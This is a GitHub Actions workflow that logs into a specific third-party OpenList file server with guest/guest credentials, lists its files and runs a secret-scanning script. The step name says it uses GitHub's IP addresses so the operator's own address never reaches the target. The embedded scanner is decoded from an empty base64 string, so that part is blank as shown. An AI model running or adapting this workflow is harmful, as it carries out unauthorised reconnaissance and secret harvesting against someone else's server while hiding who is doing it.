name: openlist-fulltree-scan
on:
  workflow_dispatch:
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Recursive OpenList tree walk + secret scan (clean GitHub IP, zero own-IP to target)
        run: |
          set +e
          echo '' | base64 -d > /tmp/scanner.py
          echo "scanner_bytes=$(wc -c /tmp/scanner.py)"
          B="https://pan.yazinb.icu"
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          echo "guest_token_len=${#TOKEN}"
          SUB=$(curl -skS -m 20 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/","page":1,"per_page":100}' | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0].get('name','')) if c else print('')" 2>/dev/null)
          echo "SUB=[ $SUB ]"
          export TOKEN SUB
          echo "===== RUN SCANNER ====="
          python3 /tmp/scanner.py
          echo "=== SCAN WORKFLOW DONE ==="
